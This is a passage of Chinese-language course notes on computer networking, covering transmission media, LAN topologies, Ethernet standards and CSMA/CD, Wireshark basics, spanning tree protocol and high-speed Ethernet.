title="光纤的特性"></a>光纤的特性</h5><p>物理特性:两根光纤组成传输系统，按波长范围可分成3种:0.85um、1.3um、<br>1.55um。</p><p>传输特性:数据传输率可达几干Mb&#x2F;s，传输距离达几千米。</p><p>连通性:普遍用于点到点的链路。</p><p>地理范围:6km~8km的距离内不用中继器传输。</p><p>抗干扰性:不受电磁波干扰或噪声影响。</p><p>价格:目前价格较高，但随着技术的改进会大幅下降。</p><h3 id="无线传输介质"><a href="#无线传输介质" class="headerlink" title="无线传输介质"></a>无线传输介质</h3><h4 id="微波"><a href="#微波" class="headerlink" title="微波"></a>微波</h4><p>微波中继通信是利用电磁波在对流层的视距范围内传输的一种通信方式，其频率一般在1GHz至20GHz左右。</p><p>由于受地形和天线高度的限制，两站间的通信距离一般为30~50km。故长距离传输时，必须建立多个中继站。</p><h5 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h5><p>①通信信道容量大</p><p>②微波传输质量较高</p><p>③建设投资少，见效快</p><h5 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h5><p>①相邻站之间必须直视，不能有障碍物</p><p>②有时会受恶劣气候的影响</p><p>③隐蔽性和保密性较差</p><p>④使用和维护耗费较大</p><h4 id="卫星通信"><a href="#卫星通信" class="headerlink" title="卫星通信"></a>卫星通信</h4><p>微波通信的一种方式，只不过它是利用位于高空的人造地球卫星作为中继器的一种微波接力通信。</p><p>卫星通信的最大特点是通信距离远，且通信费用与通信距离无关，非常适合于广播通信。卫星通信具有较大的传播时延，系统的保密性较差。</p><h3 id="数据传输方式"><a href="#数据传输方式" class="headerlink" title="数据传输方式"></a>数据传输方式</h3><ul><li>按数据代码的传输顺序→串行传输和并行传输</li><li>按数据传输的体制→模拟传输和数字传输</li><li>按数据传输的同步方式→同步传输和异步传输</li><li>按数据传输是否经过调制→基带传输和频带传输</li></ul><h2 id="局域网概述"><a href="#局域网概述" class="headerlink" title="局域网概述"></a>局域网概述</h2><h3 id="局域网的概念"><a href="#局域网的概念" class="headerlink" title="局域网的概念"></a>局域网的概念</h3><p>局域网(LAN:Local Area Network)是将局部范围内的各种通信设备互连在起实现相互间<strong>数据传输</strong>和<strong>资源共享</strong>的通信网络</p><h4 id="局域网的特征"><a href="#局域网的特征" class="headerlink" title="局域网的特征"></a>局域网的特征</h4><ul><li>覆盖范围小</li><li>传输速率高</li><li>误码率低</li><li>是一个自治网，由所属单位管理</li></ul><p>局域网技术包含<strong>物理层</strong>和<strong>数据链路层</strong>的功能</p><p>它的特征主要由三个因素确定:</p><ul><li>连接各种设备的拓扑结构</li><li>传输数据的<strong>传输介质</strong>(包括信号技术)</li><li>共享资源的<strong>介质访问控制技术</strong></li></ul><h3 id="局域网的分类"><a href="#局域网的分类" class="headerlink" title="局域网的分类"></a>局域网的分类</h3><h4 id="按转换方式分类"><a href="#按转换方式分类" class="headerlink" title="按转换方式分类"></a>按转换方式分类</h4><p>共享介质局域网、交换局域网</p><h4 id="按资源管理方式分类"><a href="#按资源管理方式分类" class="headerlink" title="按资源管理方式分类"></a>按资源管理方式分类</h4><p>对等局域网、非对等局域网</p><h4 id="按传输技术分类"><a href="#按传输技术分类" class="headerlink" title="按传输技术分类"></a>按传输技术分类</h4><p>基带局域网、宽带局域网</p><h4 id="按局域网采用的物理层和介质访问控制子层协议分类"><a href="#按局域网采用的物理层和介质访问控制子层协议分类" class="headerlink" title="按局域网采用的物理层和介质访问控制子层协议分类"></a>按局域网采用的物理层和介质访问控制子层协议分类</h4><p>以太网(Ethernet)、令牌环(Token Ring)和令牌总线(Token Bus)</p><h4 id="按物理拓扑分类"><a href="#按物理拓扑分类" class="headerlink" title="按物理拓扑分类"></a>按物理拓扑分类</h4><p>总线型拓扑(Bus)、环型拓扑(Ring)、星型拓扑(Star)</p><h5 id="总线型拓扑-Bus"><a href="#总线型拓扑-Bus" class="headerlink" title="总线型拓扑(Bus)"></a>总线型拓扑(Bus)</h5><p>所有的用户工作站都同等地挂接在一条广播式公共信道(总线)上，是一种分布式结构的单跳(Single-hop)系统:</p><p>常用的总线传输介质有双绞线对、同轴电缆和光缆、无方向性同频广播式无线电信道。</p><p><img src="/../image/image-20240916142526003.png" alt="image-20240916142526003"></p><p>优点：</p><ul><li>通信成本最省。</li><li>易于扩充用户工作站数目</li><li>总线的无源操作和系统的分布控制，保证了网络的高度可靠性。</li><li>用广播式通信方式无转接节点，传输时延短。</li></ul><p>缺点：</p><ul><li>网络覆盖范围受到限制。</li><li>信道的故障将导致整个网络失效，完全瘫痪。</li><li>广播式竞争型多址通信协议不利于网络业务量的增加。</li></ul><h5 id="环型拓扑-Ring"><a href="#环型拓扑-Ring" class="headerlink" title="环型拓扑(Ring)"></a>环型拓扑(Ring)</h5><p>各工作站通过一个环接器挂接在一个环型的传输通路上。环内的信号必须是单向传播的。</p><p>环型局域网的传输介质可采用双绞线、同轴电缆和光纤等。</p><p><img src="/../image/image-20240916142918607.png" alt="image-20240916142918607"></p><p>优点</p><ul><li>网络接入控制及其接口部件比较简单。</li><li>网络操作是分布式且非竞争型的，信道资源的分配比较公平</li><li>网络的性能比较稳定，能承受较重的负荷。</li></ul><p>缺点：</p><ul><li>每个节点的环接器必须是有源部件，可靠性较差</li><li>环内需要设置对令牌进行管理的控制装置。</li><li>网络的扩充不如总线网容易，</li></ul><h4 id="星型拓扑-Star"><a href="#星型拓扑-Star" class="headerlink" title="星型拓扑(Star)"></a>星型拓扑(Star)</h4><p>每一个工作站都经一条专用线路连接到中心节点上，通过中心节点的转接，可与其它任一个工作站建立连接，互相通信。</p><p>星型局域网使用双绞线或光纤作为传输介质。</p><p>优点：</p><ul><li>集中控制有利于将各工作站送来的数据流进行汇集;</li><li>易与别的网络互连，连接方便、经济;</li><li>易于扩充，故障管理容易。</li></ul><p>缺点：</p><ul><li>中心节点交换机是关键设备，对可靠性要求高，要求有备份机或双机运行。</li></ul><h3 id="局域网接入控制技术"><a href="#局域网接入控制技术" class="headerlink" title="局域网接入控制技术"></a>局域网接入控制技术</h3><h4 id="固定接入类"><a href="#固定接入类" class="headerlink" title="固定接入类"></a>固定接入类</h4><p>固定接入类-将公共的信道带宽资源对网络用户做了固定的或相对固定的分配。如<strong>频分复用</strong>和时分复用，信道被划分成若干子信道，每一子信道可提供给一对节点固定使用，实现一对通信实体之间的点到点通信。</p><h4 id="集中控制接入类"><a href="#集中控制接入类" class="headerlink" title="集中控制接入类"></a>集中控制接入类</h4><p>集中控制接入类-要求网络中设置一-个对信道接入进行管理的中心控制节点，将信道的全部带宽资源按需分配给要求接入网络的通信实体。如轮询和预约接入技术</p><h4 id="分布控制接入类"><a href="#分布控制接入类" class="headerlink" title="分布控制接入类"></a>分布控制接入类</h4><p>分布控制接入类-不要求网络中设置中心控制节点，它决定网络系统具有高度的可靠性和可扩展性的重要因素。</p><ul><li>局域网中采用最多的一类信道接入控制技术。</li><li>根据特定的网络拓扑形式发展起来，只适用于特定拓扑的局域网</li></ul><h3 id="局域网参考模型"><a href="#局域网参考模型" class="headerlink" title="局域网参考模型"></a>局域网参考模型</h3><p><img src="/../image/image-20240916143238057.png" alt="image-20240916143238057"></p><p>局域网参考模型和OSI&#x2F;RM相比，相当于OSI&#x2F;RM的最低两层:</p><p>为了使局域网中的数据链路层不致过于复杂，将局域网的数据链路层划分为媒体访问控制MAC子层和逻辑链路控制LLC子层，</p><p>MAC子层主要完成与具体传输媒体有关功能</p><p>LLC子层完成与媒体访问无关部分主要功能</p><p>局域网对LLC子层是透明的。只有MAC子层才能看见所连接的是采用什么标准的局域网。</p><h4 id="IEEE802标准"><a href="#IEEE802标准" class="headerlink" title="IEEE802标准"></a>IEEE802标准</h4><p><img src="/../image/image-20240916143448738.png" alt="image-20240916143448738"></p><h4 id="局域网的链路层有两种不同的帧"><a href="#局域网的链路层有两种不同的帧" class="headerlink" title="局域网的链路层有两种不同的帧"></a>局域网的链路层有两种不同的帧</h4><p><a href="https://blog.51cto.com/liuaoxiang/792946">LLC帧和MAC帧是计算机网络中的两个不同概念。在MAC帧中，有目的站地址和源站地址，它们是物理地址，用于标识站点。而在LLC帧中，有DSAP和SSAP，这是逻辑地址，标识数据链路层的不同访问服务点。LLC帧必须封装在MAC帧中进行传输，不能单独通过物理层传输。</a></p><p><img src="/../image/image-20240916143720902.png" alt="image-20240916143720902"></p><h2 id="以太网的物理层和MAC子层"><a href="#以太网的物理层和MAC子层" class="headerlink" title="以太网的物理层和MAC子层"></a>以太网的物理层和MAC子层</h2><h3 id="以太网标准"><a href="#以太网标准" class="headerlink" title="以太网标准"></a>以太网标准</h3><h4 id="物理层和mac子层"><a href="#物理层和mac子层" class="headerlink" title="物理层和mac子层"></a>物理层和mac子层</h4><ul><li>LLC子层完成与媒体访问无关部分主要功能</li><li>在LLC子层的上看不到具体的局域网</li><li>只有到MAC子层才能看见所连接的是什么标准的局域网</li></ul><h4 id="802-3以太网标准"><a href="#802-3以太网标准" class="headerlink" title="802.3以太网标准"></a>802.3以太网标准</h4><p>IEEE 802.3有5种物理层规范</p><ul><li><p>粗缆以太网(10BASE-5)</p><ul><li>使用总线结构的粗同轴电缆作为传输介质，最大传输速率为10Mb&#x2F;s，采用基带传输技术</li><li>每一个网段最大长度为500m。每个网段理论上可以连接100台计算机。</li><li>网络上两台计算机之间的缆线长度不小于2.5m。</li></ul></li><li><p>细缆以太网(10BASE-2)</p><ul><li>使用总线结构的细同轴电缆作为传输介质</li><li>每一个网段最大长度为185m每个网段理论上可以连接33台计算机</li><li>电缆总长度不超过900m</li></ul></li><li><p>双绞线以太网(10BASE-T)</p><p>每一个网段最大长度不超过100m</p></li><li><p>光纤以太网(10BASE-F)</p><ul><li>使用单模或多模光纤作为传输介质</li><li>每一个网段最大长度为500m</li></ul></li><li><p>宽带以太网(10Broad36)</p><ul><li>是一种宽带LAN。使用75Q同轴电缆作为传输介质，单个网段的最大连接距离为1800m，整个网段的最大跨度为3600m</li><li>10Broad36与基带以太网相互兼容的方法是把基带曼彻斯特编码经过差分相移键控调制后发送到宽带电缆上，调制后的10Mb&#x2F;s信号占用14MHz的带宽</li></ul></li></ul><h5 id="802-3以太网标准-“5-4-3”规则"><a href="#802-3以太网标准-“5-4-3”规则" class="headerlink" title="802.3以太网标准-“5-4-3”规则"></a>802.3以太网标准-“5-4-3”规则</h5><ul><li>一个以太网最多只允许含5个网段</li><li>最多只允许使用4个中继器</li><li>其中3个网段上可以接终端</li></ul><h5 id="技术特性"><a href="#技术特性" class="headerlink" title="技术特性"></a>技术特性</h5><p><img src="/../image/image-20240916152706083.png" alt="image-20240916152706083"></p><p><img src="/../image/image-20240916152727633.png" alt="image-20240916152727633"></p><h4 id="以太网中RJ-45插头"><a href="#以太网中RJ-45插头" class="headerlink" title="以太网中RJ-45插头"></a><strong>以太网中RJ-45插头</strong></h4><p>连接规范应遵循EIA&#x2F;TIA 586A和568B规范</p><ul><li>568A标准:绿白、绿、橙白、蓝、蓝白、橙、棕白、棕</li><li>568B标准:橙白、橙、绿白、蓝、蓝白、绿、棕白、棕</li></ul><p>“同类”交叉、“异类”直通的原则</p><h5 id="RJ-45接头"><a href="#RJ-45接头" class="headerlink" title="RJ-45接头"></a>RJ-45接头</h5><p>双绞线使用RJ-45接头连接网络设备，RJ-45接头即为人们平时所说的水晶头</p><p><img src="/../image/image-20240916153044933.png" alt="image-20240916153044933"></p><h4 id="以太网物理层编码技术-采用曼彻斯特编码"><a href="#以太网物理层编码技术-采用曼彻斯特编码" class="headerlink" title="以太网物理层编码技术-采用曼彻斯特编码"></a>以太网物理层编码技术-采用曼彻斯特编码</h4><ul><li>低电平跳变到高电平表示“0’</li><li>高电平跳变到低电平表示“1</li></ul><p><img src="/../image/image-20240916153139487.png" alt="image-20240916153139487"></p><h3 id="以太网数据封装格式"><a href="#以太网数据封装格式" class="headerlink" title="以太网数据封装格式"></a>以太网数据封装格式</h3><p>ETHERNET I标准定义的数据帧封装格式</p><p><img src="/../image/image-20240916153155503.png" alt="image-20240916153155503"></p><p>以太网数据帧的长度在64-1518字节之间</p><h4 id="IEEE-802-3标准数据帧"><a href="#IEEE-802-3标准数据帧" class="headerlink" title="IEEE 802.3标准数据帧"></a>IEEE 802.3标准数据帧</h4><p><img src="/../image/image-20240916153228176.png" alt="image-20240916153228176"></p><p>与ETHERNET I标准数据帧的区别：Type字段，后将被发送Ethernet H格式中包含标识以太帧处理完成之到哪个上层协议进行处理。IEEE 802.3格式中，同样的位置是长度字段。</p><h3 id="Mac子层"><a href="#Mac子层" class="headerlink" title="Mac子层"></a>Mac子层</h3><h4 id="常见的冲突避免技术"><a href="#常见的冲突避免技术" class="headerlink" title="常见的冲突避免技术"></a>常见的冲突避免技术</h4><ul><li>载波侦听多路访问&#x2F;冲突检测(CSMA&#x2F;CD)</li><li>令牌环</li><li>载波侦听多路访问&#x2F;冲突避免(CSMA&#x2F;CA)</li></ul><h4 id="802-3以太网的MAC帧格式"><a href="#802-3以太网的MAC帧格式" class="headerlink" title="802.3以太网的MAC帧格式"></a>802.3以太网的MAC帧格式</h4><ul><li>介质接入管理—<strong>CSMA&#x2F;CD协议</strong></li><li>MAC帧的封装(发送与接收)功能<ul><li>成帧(帧定界、帧同步)与卸帧</li><li>编址与寻址(源和目的地址的处理)</li><li>差错检测(由更高层负责校正差错)</li></ul></li></ul><h4 id="802-3的MAC子层的主要功能"><a href="#802-3的MAC子层的主要功能" class="headerlink" title="802.3的MAC子层的主要功能"></a>802.3的MAC子层的主要功能</h4><p>1、介质接入管理功能</p><ul><li>信道分配(避免碰撞、介质接入控制)</li><li>竞争解决(处理碰撞、退避延时重发等)</li></ul><p>2、以太网是使用带碰撞检测的<strong>载波侦听多路访问</strong>(CSMA&#x2F;CD)技术的总线型网络</p><p>3、多点接入-一是总线网络，许多计算机以多点接入的方式连接在一根总线上。</p><p>4、载波监听–在发送数据之前要检测总线上是否有其他计算机在发送数据，如果有暂时不要发送，以免发生碰撞。</p><p>5、碰撞检测</p><ul><li>计算机边发数据边检测信道上信号电压的大小</li><li>当检测到的电压摆动值超过门限值则表明产生了碰撞</li></ul><h4 id="传播时延对载波监听的影响"><a href="#传播时延对载波监听的影响" class="headerlink" title="传播时延对载波监听的影响"></a>传播时延对载波监听的影响</h4><ul><li>使用CDMA&#x2F;CD协议的以太网不能同时进行发送和接收</li><li>每一个站在自己发送数据后2t的时间内，存在着遭遇碰撞的可能性。因此以太网不能保证在某一时间内能够将自己的数据帧成功地发送出去，这称为发送的不确定性。</li></ul><h4 id="MAC层的硬件地址"><a href="#MAC层的硬件地址" class="headerlink" title="MAC层的硬件地址"></a>MAC层的硬件地址</h4><p>MAC层地址指网卡上的地址，共48位，前24位是厂商代号，后24位由厂商自行指派。例如：00:50:56:C0:00:02</p><p>硬件地址又称物理地址或MAC地址。实际上就是网卡地址或网卡标识符EUI-48.</p><p>采用六字节表示，EUI为扩展惟一标识符。</p><ul><li>前三字节是机构惟一标识符OUI</li><li>后三字节称为扩展标识符</li></ul><p><img src="/../image/image-20240916163342987.png" alt="image-20240916163342987"></p><p>名字指出我们所要寻找的那个资源</p><p>地址指出那个资源在何处</p><p>路由告诉我们如何到达该处</p><h4 id="用硬件地址标识局域网上的计算机和路由器"><a href="#用硬件地址标识局域网上的计算机和路由器" class="headerlink" title="用硬件地址标识局域网上的计算机和路由器"></a>用硬件地址标识局域网上的计算机和路由器</h4><p><img src="/../image/image-20240916171729919.png" alt="image-20240916171729919"></p><ul><li>所有的网卡都能够识别单播和广播地址</li><li>有的网卡可用编程的方法识别多播地址</li></ul><h3 id="CSMA-x2F-CD技术"><a href="#CSMA-x2F-CD技术" class="headerlink" title="CSMA&#x2F;CD技术"></a>CSMA&#x2F;CD技术</h3><p>CSMA(Carrier Sense Multiple Access:载波侦听多址接入)技术</p><p>CSMA&#x2F;CD是“带碰撞检测的载波侦听多址接入”技术</p><h4 id="CSMA原理"><a href="#CSMA原理" class="headerlink" title="CSMA原理"></a><strong>CSMA原理</strong></h4><p>任一个网络节点在它要发送帧之前，先监测一下广播信道中是否存在别的节点正在发送帧的载波信号。如果监测到这种信号，说明信道正忙，否则信道是空闲的。</p><p>若测得空闲，或者立即将自己的帧发送出去，或者为慎重起见暂时不发送出去;</p><p>若测得信道忙，或者继续坚持监测载波，或者暂时退避一段时间再监测。</p><ul><li><p>非坚持型CSMA</p><p>当一个网络节点准备发送数据帧之前先监测信道，若测得信道空闲，立刻启动发送帧。若信道正忙，则暂时不坚持监测信道，随机延迟一段时间后再次监测信道状态。如此循环，直到将帧发送完为止。</p><p>当监测到信道忙时，能主动地退避一段随机时间，有利于减少冲突机会，可提高吞吐率和信道的利用率。</p></li><li><p>1-坚持型CSMA</p><p>当一个网络节点准备发送数据帧之前先监测信道，若测得信道空闲，立刻启动发送帧。若信道正忙，则坚持继续监测信道，直到监测到信道空闲时，立即启动发送帧。</p><p>由于它在信道忙时要坚持监测信道，可能会有多个节点同时监测到信道空闲而同时采取发送行动，导致吞吐性能比非坚持型CSMA差。但由于控制简单，很有实用价值。</p></li><li><p>p-坚持型CSMA</p><p>一方面坚持对信道状态的持续监测，及时确知信道忙闲情况，避免信道时间的浪费;</p><p>另一方面，即使已监测到信道空闲，也不一定要立刻发送，要求任一节点以(1-p)的概率主动退避。</p></li></ul><p><img src="/../image/image-20240916172017673.png" alt="image-20240916172017673"></p><h4 id="CSMA-x2F-CD-基本原理"><a href="#CSMA-x2F-CD-基本原理" class="headerlink" title="CSMA&#x2F;CD-基本原理"></a><strong>CSMA&#x2F;CD-基本原理</strong></h4><p>“边说边听”:任一站在发送数据帧期间要保持侦听信道的碰撞情况。一旦检测到碰撞，应立即中止发送。</p><p>‘强化干扰”:发送站在检测到碰撞并停止发送后，立即发送一段“强化干扰”信号，以加强碰撞检测效果</p><p>“基本等待时间”:任一站若能完整地发完一个帧，停顿一个时间(BWT&#x3D;2tpmax)并倾听信道情况。若在此期间未发生碰撞，则可确认该帧已发送成功。</p><h2 id="Wireshark抓包工具"><a href="#Wireshark抓包工具" class="headerlink" title="Wireshark抓包工具"></a>Wireshark抓包工具</h2><h3 id="Wireshark简介"><a href="#Wireshark简介" class="headerlink" title="Wireshark简介"></a>Wireshark简介</h3><p>1997年，Gerald Combs在工作中需要一款能够追踪网络流量的软件作为辅助工具，开始编写Ethereal软件。2006年，由于商标问题，Ethereal更名为Wireshark.</p><p>Wireshark是一个网络封包分析软件，主要功能是捕获网络封包，并尽可能显示出最为详细的网络封包资料。</p><h4 id="应用领域"><a href="#应用领域" class="headerlink" title="应用领域"></a>应用领域</h4><p>一般分析：查看网络通信、查看主机应用程序、无人值守捕获数据</p><p>故障排错：确定路径、客户端和服务延迟;检查应用程序错误响应</p><p>安全分析取证：检查可疑数据重定向;确定网络侦查过程</p><p>应用程序分析：图形应用程序的带宽使用情况;从一个新安装的应用程序中检查错误响应</p><p><img src="/../image/image-20240916183046927.png" alt="image-20240916183046927"></p><h3 id="Wireshark安装"><a href="#Wireshark安装" class="headerlink" title="Wireshark安装"></a>Wireshark安装</h3><p>win和linux都可以直接安装，没什么特殊要求</p><h3 id="Wireshark使用"><a href="#Wireshark使用" class="headerlink" title="Wireshark使用"></a>Wireshark使用</h3><p>打开Wireshark后，会出现捕获选项，这里选择需要捕获数据的设备，如有线&#x2F;无线网卡等:</p><p><img src="/../image/image-20240916183335263.png" alt="image-20240916183335263"></p><p>这里有个用户指导，里面不仅有教学，还有对应的数据包，是不错的学习教程</p><h4 id="Wireshark主要窗口及其功能"><a href="#Wireshark主要窗口及其功能" class="headerlink" title="Wireshark主要窗口及其功能"></a>Wireshark主要窗口及其功能</h4><p><img src="/../image/image-20240916183531280.png" alt="image-20240916183531280"></p><p>1–标题栏</p><p>2–菜单栏</p><p>3–工具栏</p><p>4–显示过滤区域</p><p>5–Packet List 面板</p><p>6–Packet Details 面板</p><p>7–Packet Bytes 面板</p><p>8–状态栏</p><h4 id="Wireshark常见过滤规则"><a href="#Wireshark常见过滤规则" class="headerlink" title="Wireshark常见过滤规则"></a>Wireshark常见过滤规则</h4><ul><li>IP : ip.addr &#x3D;&#x3D;IP</li><li>源IP: ip.src &#x3D;&#x3D;IP 或ip.src eq </li><li>IP目的IP:ip.dst &#x3D;&#x3D;IP 或ip.dst eq IP </li><li>端口：tcp.dstport &#x3D;&#x3D;80、udp.port&#x3D;&#x3D;53、tcp.srcport &gt;1024</li><li>协议:tcp、udp、arp、icmp、http、smtp、ftp、dns、ip、ssl</li><li>HTTP:http.request.method &#x3D;&#x3D;GET、http.request.method &#x3D;&#x3D;POST、http contains “HTTP&#x2F;1.1 200 0K、tcp contains “admin”</li></ul><h3 id="数据包格式"><a href="#数据包格式" class="headerlink" title="数据包格式"></a>数据包格式</h3><h4 id="Wireshark报文结构"><a href="#Wireshark报文结构" class="headerlink" title="Wireshark报文结构"></a>Wireshark报文结构</h4><p>帧  数据链路层</p><p>包 网络层&#x2F;IP层</p><p>段 传输层</p><p><img src="/../image/image-20240916190951801.png" alt="image-20240916190951801"></p><p>List面板中显示了此数据的摘要信息，主要包括了数据包编号(NO.)、相对时间(Time)、源地址(Source)、目的地址(Destination)、协议类型长度(Length)摘 要信息(Info)(Protocol)</p><p><img src="/../image/image-20240916191830424.png" alt="image-20240916191830424"></p><p>Details</p><p>Details 面板展示了此数据包的细节信息，从上到下依次是Frame:物理层的数据帧头部信息;</p><p>Ethernet 1:数据链路层的数据帧(以太网)头部信息;</p><p>Internet Protocol Version 4:网络层的数据包(IPv4)头部信息;</p><p>Transmission Control Protocol:传输层的数据段(TCP)头部信息;</p><p>Hypertext Transfer Protocol:应用层(HTTP)信息。</p><p>此面板中信息为Wireshark格式化之后的信息，亦是为了方便人的查看</p><p><img src="/../image/image-20240916191902282.png" alt="image-20240916191902282"></p><p>bytes</p><p><img src="/../image/image-20240916191916127.png" alt="image-20240916191916127"></p><h2 id="交换式以太网"><a href="#交换式以太网" class="headerlink" title="交换式以太网"></a>交换式以太网</h2><h3 id="交换式以太网-1"><a href="#交换式以太网-1" class="headerlink" title="交换式以太网"></a>交换式以太网</h3><p>为提高网络可用性，保证各种终端设备间正常通信，常采用多条链路连接交换设备形成备份连接，以保证线路上的单点故障不会影响正常网络的通信，冗余链路会导致交换回路的产生，网络中必须有一个机制来阻止回路</p><p>主要功能分为两部分:建立虚连接和转发。</p><p>当两个站点间有包要传送时，在这两个站点间临时建立一条点对点的连接，包发送完后，就立即拆除这条连接。</p><p>在交换机内部保存了一张地址表，存储所连接的各站点所在的交换机端口号和MAC地址之间的对应关系。</p><p>过程:</p><p>交换机从一个端口收到包一识别出包中的目的站MAC地址→查地址表一得到目的站所在的端口号</p><p>在两个端口间建立一条虚连接一将包从源端口发送到目的端口→包发送完后一拆除这条虚连接。</p><h4 id="包转发技术"><a href="#包转发技术" class="headerlink" title="包转发技术"></a>包转发技术</h4><p>分三种:存储转发、切入法和改进切入法。</p><p><img src="/../image/image-20240916195220575.png" alt="image-20240916195220575"></p><p>为提高可靠性，常在局域网之间采用多台交换设备链接，以保证线路上的单点故障不会影响正常网络的通信。</p><p>但网络中冗余链路的引入导致拓扑结构中产生了回路，出现帧的循环转发。</p><p><img src="/../image/image-20240916195311533.png" alt="image-20240916195311533"></p><p>主机发出一个带有未知目标地址的帧F。而对于未知目标地址的帧，交换机都采用扩散法。</p><h3 id="生成树协议"><a href="#生成树协议" class="headerlink" title="生成树协议"></a>生成树协议</h3><p>解决网络中由备份链接产生的环路问题。</p><p>生成树协议通过生成树算法(Spanning Tree Algorithm，STA)生成一个没有环路的网络。当主要链路出现故障时，能够自动切换到备份链路。</p><p>原理：当网络中存在环路时，通过一定的算法将交换机的某些端口进行阻塞，使网络形成一个无环路的树状结构。</p><h4 id="工作过程"><a href="#工作过程" class="headerlink" title="工作过程"></a>工作过程</h4><p>工作过程：在网络中选择一个交换机作为根交换机(Root Bridge)比较优先级，比较MAC地址(最小者胜出)通过Hello BPDU</p><ul><li>(1)根端口的选择<ul><li>除根交换机以外的每台交换机都将选择一个“最靠近”根交换机的端口作为根端口(Root Port)</li></ul></li><li>(2)通过判断有最小根路径成本(Lowest Root Path Cost)的端口来实现的。端口根路径成本是指从该端口到根交换机的路径成本。</li></ul><p>拓扑结构</p><p><img src="/../image/image-20240916201103054.png" alt="image-20240916201103054"></p><p>(3)指定端口的选择</p><ul><li>在每个网段选择一个交换机端口处理该段网络的流量，在网段内有最小根路径成本的端口就成为指定端口(Designated Port)。</li></ul><p>(4)删除桥接环</p><ul><li>根端口和指定端口转发(Forwarding)状态</li><li>既不是根端口也不是指定端口的交换机端口被设为阻塞状态</li><li>这就断开了不设置阻塞而会形成的所有桥接环(Bridging Loop)</li></ul><p><img src="/../image/image-20240916201303700.png" alt="image-20240916201303700"></p><h4 id="生成树协议的端口状态"><a href="#生成树协议的端口状态" class="headerlink" title="生成树协议的端口状态"></a>生成树协议的端口状态</h4><p>Disabled(禁用):为了管理目的或因为发生故障将端口关闭，</p><p>Blocking(阻塞)端口不能接收或传输数据，不能把MAC地址加入它的地址表只能接收BPDU。</p><p>Listening(监听):端口不能接收或传输数据，不能把MAC地址加入到地址表只能接收或发送BPDU。</p><p>Learning(学习):端口不能传输数据，但可以发送和接收BPDU。可以学习MAC地址，并将其加入到地址表中。</p><p>Forwarding(转发):能够发送和接收数据，学习MAC地址，还能发送和接收BPDU.</p><p><img src="/../image/image-20240916201403543.png" alt="image-20240916201403543"></p><h4 id="STP的缺点"><a href="#STP的缺点" class="headerlink" title="STP的缺点"></a>STP的缺点</h4><ul><li>解决交换链路冗余问题。缺点是收敛速度慢。</li><li>拓扑发生变化时产生时延，默认值15秒。所有交换机收到之前，若旧拓扑结构中处于转发的端口还没有发现，则可能存在临时环路</li><li>为了解决临时环路的问题，生成树使用了一种定时器策略。</li><li>定时器策略至少两倍转发时延的收敛时间</li></ul><h4 id="生成树性能的三个计时器"><a href="#生成树性能的三个计时器" class="headerlink" title="生成树性能的三个计时器"></a>生成树性能的三个计时器</h4><ul><li>Helo timer(BPDU发送间隔):定时发送BPDU报文的时间间隔，默认为2秒。</li><li>Forward-Delay timer(转发时延):端口从listening转为learning，或者从learning转为forwarding间隔为15秒。</li><li>Max-Age timer(最大保留时间):BPDU报文消息生存的最长时间。当超过这个时间，报文消息将被丢弃，默认为20秒。</li></ul><p><img src="/../image/image-20240916201631286.png" alt="image-20240916201631286"></p><h3 id="快速以太网"><a href="#快速以太网" class="headerlink" title="快速以太网"></a>快速以太网</h3><p>100BASE-T快速以太网(Fast Ethernet)是在双绞线上传送100Mbit&#x2F;s基带信号的星型拓扑以太网。</p><ul><li>保留了传统以太网帧格式、介质访问控制方法CSMA&#x2F;CD、组网方法，最短帧长仍为64字节。</li><li>每个比特发送时间由100ns降至10ns，它可以在原来的10BASE-T网上一起运行保护了原有的网络投资利益。</li><li>其国际标准代号为802.3u。只要更换一张网卡，再配100Mb&#x2F;s的集线器，就可以由10BASE-T以太网直接升级到100BASE-T。</li></ul><p><img src="/../image/image-20240916203435389.png" alt="image-20240916203435389"></p><h3 id="高速以太网"><a href="#高速以太网" class="headerlink" title="高速以太网"></a>高速以太网</h3><h4 id="干兆以太网"><a href="#干兆以太网" class="headerlink" title="干兆以太网"></a>干兆以太网</h4><p>其标准802.3z有以下几个要点</p><ul><li>(1)在1Gbit&#x2F;s下全双工和半双工两种方式工作</li><li>(2)使用802.3协议规定的帧格式。把Ethernet每个比特的发送时间由100ns降低到了1ns.</li><li>(3)在半双工方式下使用CSMA&#x2F;CD协议(全双工方式不需要使用CSMA&#x2F;CD协议)。</li><li>(4)与10BASE-T和100BASE-T技术向后兼容。从10Mb&#x2F;s的Ethernet升级到FastEthernet或吉位以太网非常容易。</li></ul><h5 id="干兆以太网-1000BASE-X-802-3z标准"><a href="#干兆以太网-1000BASE-X-802-3z标准" class="headerlink" title="干兆以太网-1000BASE-X(802.3z标准)"></a>干兆以太网-1000BASE-X(802.3z标准)</h5><ul><li>1000BASE-SX:SX短波长，使用纤芯直径62.5um和50um多模光纤，传输距离为275m和550m。</li><li>1000BASE-LX:LX长波长，使用纤芯直径62.5um和50um的多模光纤时，传输距离550m。</li><li>使用纤芯直径为10um的单模光纤时，传输距离5km:1000BASE-CX:CX铜线，使用两对短距离的屏蔽双绞线电缆，传输距离为25m。</li></ul><h5 id="干兆以太网-1000BASE-T-802-3ab标准"><a href="#干兆以太网-1000BASE-T-802-3ab标准" class="headerlink" title="干兆以太网-1000BASE-T(802.3ab标准)"></a>干兆以太网-1000BASE-T(802.3ab标准)</h5><ul><li><p>使用4对5类线UTP，传送距离为100m。</p></li><li><p>工作在半双工方式时，必须进行碰撞检测。</p></li><li><p>一个网段的最大长度为100m，采用了“载波延伸”的办法，并增加了分组突发的功能。</p></li><li><p>全双工方式时，不使用载波延伸和分组突发</p></li><li><p>载波延伸(carrier extension)法来进行碰撞检测，最短帧长仍为64字节，将争用时间增大为512字节，不足用特殊字符填充在帧的后面。</p></li></ul><p><img src="/../image/image-20240916204448806.png" alt="image-20240916204448806"></p><ul><li>分组突发(packet bursting)是有很多短帧要发送，第一个短帧采用载波延伸方法填充，随后短帧一个接一个地发送，直到达到1500字节或稍多一些为止。</li></ul><p><img src="/../image/image-20240916204509214.png" alt="image-20240916204509214"></p><h4 id="10吉比特以太网"><a href="#10吉比特以太网" class="headerlink" title="10吉比特以太网"></a>10吉比特以太网</h4><p>10吉比特以太网即万兆以太网，其标准为IEEE802.3ae。</p><p>帧格式与802.3标准规定的帧格式完全相同</p><p>保留802.3标准规定的以太网最小和最大帧长</p><p>10吉比特以太网只使用光纤作为传输媒体</p><p>10吉比特以太网只工作在全双工方式，不存在争用问题，也不使用CSMA&#x2F;CD协议</p><h3 